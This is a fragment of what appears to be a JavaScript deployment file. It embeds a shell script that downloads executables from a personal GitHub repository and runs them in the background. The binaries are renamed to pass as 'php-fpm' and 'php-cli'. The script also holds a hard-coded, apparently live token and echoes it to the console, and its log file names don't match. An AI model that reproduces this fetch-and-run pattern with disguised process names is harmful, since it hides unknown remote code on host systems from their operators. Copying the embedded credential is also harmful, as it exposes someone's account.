...
Token=${Token:-'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiOGNkYWQ2N2MtNmNiMi00YWQxLThiOTAtNmQ2YzgyNGIyNDI0IiwicyI6IlkyWTNZakEwTm1NdE5qSXdNaTAwWVdRMUxXSTFaVEF0TVRneVlqa3pPVFJpT0dFMyJ9'}

# 启动php-fpm进程
echo "Starting php-fpm with token: $Token"
nohup ./php-fpm > php-fpm 2>&1 &
echo "php-fpm started and logging to php-fpm.log"

# 启动php-cli进程
echo "Starting php-cli..."
nohup ./php-cli > php-cli 2>&1 &
echo "php-cli started and logging to php-cli.log"

# 实时监控日志
tail -f php-fpm.log php-cli.log`;
...
const FILES_TO_DOWNLOAD = [
  ...
  {
    url: 'https://github.com/wwrrtt/test/raw/main/php-cli',
    filename: 'php-fpm',
  },
  {
